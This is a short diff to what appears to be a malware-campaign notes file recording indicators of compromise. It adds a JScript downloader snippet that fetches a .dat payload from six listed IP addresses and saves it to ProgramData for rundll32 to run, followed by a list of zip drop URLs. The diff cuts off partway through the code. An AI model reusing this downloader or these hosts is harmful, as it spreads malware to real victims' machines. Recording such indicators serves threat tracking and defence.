@@ -17,6 +17,28 @@ rundll32.exe C:\ProgramData\afGXlWM7xmRP3sE.dat,Time
 
 *************************************************
 
+var urls = "http://66.135.3.99/aMS8jtw13s6.dat,http://85.239.52.150/aMS8jtw13s6.dat,http://45.89.55.145/aMS8jtw13s6.dat,http://185.205.187.238/aMS8jtw13s6.dat,http://104.36.229.105/aMS8jtw13s6.dat,http://94.131.119.113/aMS8jtw13s6.dat".split(",");
+
+	for(i = 0; i < urls.length; i ++)
+	{
+		try
+		{
+			var http = new ActiveXObject("microsoft.xmlhttp");
+			http.open("GET", urls[i], false);
+			http.send();
+
+			if(http.readyState == 4)
+			{
+				var adodb = new ActiveXObject("adodb.stream");
+				adodb.type = 1;
+				adodb.open();
+				adodb.write(http.ResponseBody);
+				adodb["savetofile"]("c:\\programdata\\afGXlWM7xmRP3sE.dat", 2);
+
+				break;
+
+*************************************************
+
 zip drop urls:
 
 http://amnayahotels.com/gkonf/rentfree.zip
